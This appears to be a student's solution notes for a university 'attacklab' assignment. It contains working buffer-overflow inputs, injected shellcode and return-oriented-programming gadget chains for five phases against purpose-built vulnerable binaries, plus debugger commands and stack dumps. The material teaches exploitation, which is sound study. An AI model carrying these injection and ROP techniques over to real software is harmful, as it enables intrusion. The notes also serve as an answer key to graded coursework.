This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.


# Phase1
## Target
`004018ce`

## Input
```
57 61 74 61 73 68 69 77 6f 20
75 67 6f 6b 61 73 75 6e 6f 77
61 20 6b 6f 6e 6f 69 62 61 73
68 6f 00 00 00 00 00 00 00 00
ce 18 40 00 00 00 00 00
``

## Commands
* `run -q < ctarget1_raw.txt`	-> Run in quiet mode with given text
* `display/8gx $rsp`			-> Print 8 qwords in stack whenever it runs
* `ni`							-> Next instruction
* `kill`						-> Kill currently running
* `layout asm`					-> Assembly layout

## Breakpoints
`br *0x004018c4`

# Prob2
## Target
`004018fa`

## Command
`run -q < inputs/p2/input_raw.txt`

## Code
```
movl $0x17e4e6ea, %edi
subq $0x8, %rsp
movq $0x4018fa, (%rsp)
ret
```

## Compiled
```
bf ea e6 e4 17 48 83 ec
08 48 c7 04 24 fa 18 40
00 c3
```

## Input
```
50 6f 70 70 69 6e 27 20
50 61 72 74 79 00 00 00
bf ea e6 e4 17 48 83 ec
08 48 c7 04 24 fa 18 40
00 c3 00 00 00 00 00 00
28 63 64 55 00 00 00 00
```

# Prob3
## Target
```
00401a0b
(Cookie) 17e4e6ea -> 31 37 65 34 65 36 65 61
```

## Command
* `run -q < inputs/p3/input_raw.txt`
* `x/2x $edi`
* `p/2x $rdi`
* `x/20gx $rsp - 10`

## Breakpoints
* `br *0x004018cd` // Before called
* `br *0x00401a1c` // After called
* `br *0x004019d5` // After sprintf

## Inspection
BeforeCall
```
0x55646340:     0x0000000055646329      0x0000000000000000
0x55646350:     0x000000000040201e      0x0000000000000000
0x55646360:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

AfterCall (rsp -> 0x556448)
```
0x55646318:     0x0061696c65736f52      0x6165366534653731
0x55646328:     0x55646320c7c74800      0x2404c74808ec8348
0x55646338:     0x000000c300401a0b      0x0000000055646329
0x55646348:     0x0000000000000000      0x000000000040201e
0x55646358:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
```

BeforeRet (rsp -> 0x556440)
```
0x55646310:     0x00000000004018c4      0x0061696c65736f52
0x55646320:     0x6165366534653731      0x55646320c7c74800
0x55646330:     0x2404c74808ec8348      0x000000c300401a0b
0x55646340:     0x0000000000401a0b      0x0000000000000000
0x55646350:     0x000000000040201e      0x0000000000000000
```

## Code
```
movq $0x55646320, %rdi
subq $0x7f, %rsp
movq $0x401a0b, (%rsp)
ret
```

## Input
```
52 6f 73 65 6c 69 61 00
31 37 65 34 65 36 65 61
00 48 c7 c7 20 63 64 55
48 83 ec 7f 48 c7 04 24
0b 1a 40 00 c3 00 00 00
28 63 64 55 00 00 00 00
```

# Prob4
## Target
`0x17e4e6ea`

## Farm
* `rdi = 0x92c78948` (setval_272)
* `rdi = 0xc3949058` (setval_192)
* `rdi = 0x58ecc8b4` (setval_378)
	* `popq %rax`
* `rdi = 0xc78948ac` (setval_214)
	* `%rax -> %rdi`
	* `%eax -> %edi`
* `eax = rdi + 0x58497d71` (addval_305)
	* `popq %rax`
* `eax = rdi - 0x3e3876b8` (addval_275)
* `eax = rdi - 0x6f3876b8` (addval_276)
	* `%rax -> %rdi`
	* `%eax -> %edi`
* `eax = rdi - 0x3c6f6ba8` (addval_365)

## Gadgets
`popq %rax`		00401abb
`ret`
`%rax -> rdi`	00401ac7
`ret`
`touch2`		004018fa

## Input
```
41 6d 65 61 67 61 72 69
20 6b 61 73 61 20 77 6f
20 73 75 74 65 74 65 20
68 61 62 61 74 61 6b 75
20 79 75 6d 65 20 77 6f
bb 1a 40 00 00 00 00 00
ea e6 e4 17 00 00 00 00
c7 1a 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

## Command
`run -q < inputs/p4/input_raw.txt`

# Prob5

## Farm
* `rax -> rdi, eax -> edi` (setval_214)
* `rax -> rdi, eax -> edi` (addval_276)
* `rax = rdi + rsi` (add_xy)
* `popq rax` (setval_378)
* `popq rax` (addval_305)
* `eax -> ecx` (addval_169)
* `ecx -> edx` (getval_273)
* `rsp -> rax` (getval_189)
* `edx -> esi` (setval_441)

## Gadgets
`rsp -> rax`			00401b07 (getval_189)
`ret`
`rax -> rdi`			00401ac7 (setval_214)
`ret`
`popq rax (+72)`		00401abb (addval_305)
`ret`
`eax -> ecx`			00401aed (addval_169)
`ret`
`ecx -> edx`			00401b02 (getval_273)
`ret`
`edx -> esi`			00401b2e (setval_441)
`ret`
`rdi + rsi -> rax`		00401ae6
`ret`
`rax -> rdi`			00401ac7
`ret`
`touch3`				00401a0b

## Input

```
79 6f 75 74 75 2e 62 65 /* Stuffs to fill in the blank */
2f 70 53 6c 67 64 48 6d
5f 32 58 55 20 20 20 20
44 6f 75 62 6c 65 20 52
61 69 6e 62 6f 77 00 00 /* Your code starts from now... */
07 1b 40 00 00 00 00 00 /* +8	rsp -> rax							*/
c7 1a 40 00 00 00 00 00 /* +16	rax -> rdi (+8)						*/
bb 1a 40 00 00 00 00 00 /* +24	popq rax							*/
48 00 00 00 00 00 00 00 /* +32	(0x48 = 72)							*/
ed 1a 40 00 00 00 00 00 /* +40	eax -> ecx							*/
02 1b 40 00 00 00 00 00 /* +48	ecx -> edx							*/
2e 1b 40 00 00 00 00 00 /* +56	edx -> esi (80)						*/
e6 1a 40 00 00 00 00 00 /* +64	rdi (+8) + rsi (72) -> rax (+80)	*/
c7 1a 40 00 00 00 00 00 /* +72	rax -> rdi (+80)					*/
0b 1a 40 00 00 00 00 00 /* +80	touch3								*/
31 37 65 34 65 36 65 61 /* +88	Cookie								*/
```

## Command
`run -q < inputs/p5/input_raw.txt`
